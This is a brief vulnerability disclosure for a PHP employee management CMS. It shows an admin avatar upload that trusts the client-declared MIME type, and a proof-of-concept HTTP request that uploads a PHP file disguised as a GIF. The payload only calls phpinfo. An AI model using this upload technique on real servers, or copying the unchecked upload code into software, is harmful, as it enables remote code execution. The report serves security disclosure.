### Vulnerability file address

In line 26 of `Admin/add-admin.php`, `$image_name= addslashes($_FILES['avatar']['name']);`, the file extension is not whitelisted. Following up to line 28, `move_uploaded_file($_FILES["avatar"]["tmp_name"], "../uploadImage/Profile/" . $_FILES["avatar"]["name"]);`, the file is uploaded to the `uploadImage/Profile/` directory.

```php
<?php
include('../inc/topbar.php');
if(empty($_SESSION['admin-username']))
    {
      header("Location: login.php");
    }


if(isset($_POST["btncreate"]))
{

$username = $_POST['txtusername'];
$name = $_POST['txtfullname'];
$password = $_POST['txtpassword'];
$phone = $_POST['txtphone'];

$file_type = $_FILES['avatar']['type']; //returns the mimetype
$allowed = array("image/jpg", "image/gif","image/jpeg", "image/webp","image/png");
if(!in_array($file_type, $allowed)) {
$_SESSION['error'] ='Only jpg,jpeg,Webp, gif, and png files are allowed. ';

// exit();

}else{
$image= addslashes(file_get_contents($_FILES['avatar']['tmp_name']));
$image_name= addslashes($_FILES['avatar']['name']);
$image_size= getimagesize($_FILES['avatar']['tmp_name']);
move_uploaded_file($_FILES["avatar"]["tmp_name"],"../uploadImage/Profile/" . $_FILES["avatar"]["name"]);
$location="uploadImage/Profile/" . $_FILES["avatar"]["name"];
```

### POC

```html
POST /CMS/php/employee_akpoly/Admin/add-admin.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------16091284793005290372415211762
Content-Length: 817
Origin: http://10.0.0.20:82
Connection: close
Referer: http://10.0.0.20:82/CMS/php/employee_akpoly/Admin/add-admin.php
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1

-----------------------------16091284793005290372415211762
Content-Disposition: form-data; name="txtusername"


-----------------------------16091284793005290372415211762
Content-Disposition: form-data; name="txtfullname"


-----------------------------16091284793005290372415211762
Content-Disposition: form-data; name="txtpassword"


-----------------------------16091284793005290372415211762
Content-Disposition: form-data; name="txtphone"


-----------------------------16091284793005290372415211762
Content-Disposition: form-data; name="avatar"; filename="2.php"
Content-Type: image/jpeg

GIF89a<?php phpinfo(); ?>

-----------------------------16091284793005290372415211762
Content-Disposition: form-data; name="btncreate"


-----------------------------16091284793005290372415211762--
```

### Attack results pictures

![image-20250128103944792](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501281242813.png)

![image-20250128105930461](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501281242274.png)





